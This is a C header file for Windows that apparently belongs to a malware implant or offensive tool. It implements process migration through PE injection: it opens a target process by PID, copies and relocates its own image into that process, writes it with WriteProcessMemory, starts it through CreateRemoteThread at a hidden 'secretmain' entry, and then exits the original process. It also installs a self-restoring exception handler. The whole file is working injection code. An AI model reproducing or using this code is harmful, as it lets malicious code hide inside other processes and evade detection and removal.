#ifndef MIGRATE_INCL
#define MIGRATE_INCL
#include <stdio.h>
#include <windows.h>
void* revival = NULL;
void* imageBase = NULL;
SIZE_T dllImageSize = 0;
unsigned long long deltaIB = 0;
int isChild = 0;
void secretmain(){
    main(69420, 0);
}
LONG WINAPI hand(EXCEPTION_POINTERS *pExceptionInfo){
    //note: this is only enabled when in origin process so as to not interfere too much with VEHs registered by injected processes
    printf("using revive!\n");
    for(int i=0;i<dllImageSize;i+=0x1000){
        DWORD a, b;
        VirtualProtect(imageBase + i, 0x1000, PAGE_EXECUTE_READWRITE, &a);
        memcpy(imageBase + i, revival + i, 0x1000);
        VirtualProtect(imageBase + i, 0x1000, a, &b);
    }
    pExceptionInfo->ContextRecord->Rip = (unsigned long long)main;
    return EXCEPTION_CONTINUE_EXECUTION;
}

int migrate(int pid){
	// Get current image's base address
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)revival;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)revival + dosHeader->e_lfanew);

	// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, revival, ntHeader->OptionalHeader.SizeOfImage);
    PIMAGE_NT_HEADERS ntHeader2 = (PIMAGE_NT_HEADERS)((DWORD_PTR)localImage + dosHeader->e_lfanew);
    
	// Open the target process - this is process we will be injecting this PE into
	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
	if(targetProcess == NULL) return -1;
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	if(targetImage == NULL) return -1;
	ntHeader2->OptionalHeader.ImageBase = (unsigned long long)targetImage;
	//patch the ImageBase as GetModuleHandleA returns parent image
    *(unsigned long long*)(localImage+deltaIB) = (unsigned long long)targetImage;
	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0){
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++){
			if (relocationRVA[i].Offset){
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

    if(WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL) == 0) return -1;
    for (int count = 0; count < ntHeader->FileHeader.NumberOfSections; count++){
        PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((DWORD64)localImage + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * 40));
        if(SectionHeader->Characteristics & IMAGE_SCN_CNT_CODE){
            DWORD a;
            VirtualProtectEx(targetProcess, (LPVOID)((DWORD64)targetImage + SectionHeader->VirtualAddress), SectionHeader->SizeOfRawData, PAGE_EXECUTE_READ, &a);
        }
    }
    
	if(CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)secretmain + deltaImageBase), NULL, 0, NULL) == NULL) return -1;
    if(isChild)
    	ExitThread(0);
	else
        ExitProcess(0);
}
#endif